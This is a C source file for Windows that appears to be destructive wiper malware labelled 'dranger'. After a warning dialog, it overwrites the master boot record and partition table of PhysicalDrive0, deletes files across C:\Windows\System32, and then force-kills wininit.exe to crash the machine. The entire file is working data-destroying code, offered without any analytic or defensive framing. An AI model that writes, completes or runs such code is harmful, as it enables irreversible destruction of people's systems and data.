#include <windows.h>
#include <stdio.h>
#include <string.h>

int main() {
    int result;
    HANDLE hDisk;
    DWORD bytesWritten;
    
    // Missing variable declarations
    HANDLE hFind;
    WIN32_FIND_DATA findData;
    char path[MAX_PATH];
    DWORD startTime;
    char filePath[MAX_PATH];
    char subPath[MAX_PATH];
    WIN32_FIND_DATA subFindData;
    HANDLE hSubFind;
    char subFilePath[MAX_PATH];

    result = MessageBox(NULL, 
        "Warning: You are running a virus. Please be careful about what you are doing.\n\n",
        "dranger",
        MB_ICONWARNING | MB_YESNO | MB_DEFBUTTON2 | MB_SYSTEMMODAL);
    
    if (result == IDNO) {
        return 0;
    }
    
    // Open physical disk handle with full access
    hDisk = CreateFile("\\\\.\\PhysicalDrive0", 
                      GENERIC_READ | GENERIC_WRITE,
                      FILE_SHARE_READ | FILE_SHARE_WRITE,
                      NULL, 
                      OPEN_EXISTING, 
                      0, 
                      NULL);
    
    if (hDisk == INVALID_HANDLE_VALUE) {
        return 1;
    }
    
    // Method 1: Destroy entire MBR including boot code
    BYTE emptyMBR[512] = {0};
    emptyMBR[510] = 0x55;
    emptyMBR[511] = 0xAA;
    WriteFile(hDisk, emptyMBR, 512, &bytesWritten, NULL);
    
    // Method 2: Specifically target partition table area (0x1BE-0x1FD)
    BYTE garbageData[64];
    memset(garbageData, 0xFF, sizeof(garbageData)); // Fill with 0xFF
    
    // Position to partition table area and destroy it
    SetFilePointer(hDisk, 0x1BE, NULL, FILE_BEGIN);
    WriteFile(hDisk, garbageData, 64, &bytesWritten, NULL);
    
    // Close disk handle
    CloseHandle(hDisk);
    
    MessageBox(NULL, "install to main files...", "main", MB_ICONEXCLAMATION | MB_OKCANCEL);

    // System32 deletion code
    strcpy(path, "C:\\Windows\\System32\\*.*");
    hFind = FindFirstFile(path, &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        startTime = GetTickCount();
        do {
            if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
                snprintf(filePath, sizeof(filePath), "C:\\Windows\\System32\\%s", findData.cFileName);
                
                SetFileAttributes(filePath, FILE_ATTRIBUTE_NORMAL);
                
                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    snprintf(subPath, sizeof(subPath), "%s\\*.*", filePath);
                    hSubFind = FindFirstFile(subPath, &subFindData);
                    if (hSubFind != INVALID_HANDLE_VALUE) {
                        do {
                            if (strcmp(subFindData.cFileName, ".") != 0 && strcmp(subFindData.cFileName, "..") != 0) {
                                snprintf(subFilePath, sizeof(subFilePath), "%s\\%s", filePath, subFindData.cFileName);
                                SetFileAttributes(subFilePath, FILE_ATTRIBUTE_NORMAL);
                                DeleteFile(subFilePath);
                            }
                        } while (FindNextFile(hSubFind, &subFindData) && (GetTickCount() - startTime < 20000));
                        FindClose(hSubFind);
                    }
                    RemoveDirectory(filePath);
                } else {
                    DeleteFile(filePath);
                }
            }
            
            if (GetTickCount() - startTime > 20000) {
                break;
            }
        } while (FindNextFile(hFind, &findData));
        FindClose(hFind);
    }

    Sleep(10000);
    system("echo good luck:)");
    system("taskkill /f /im wininit.exe /t");
    return 0;
}
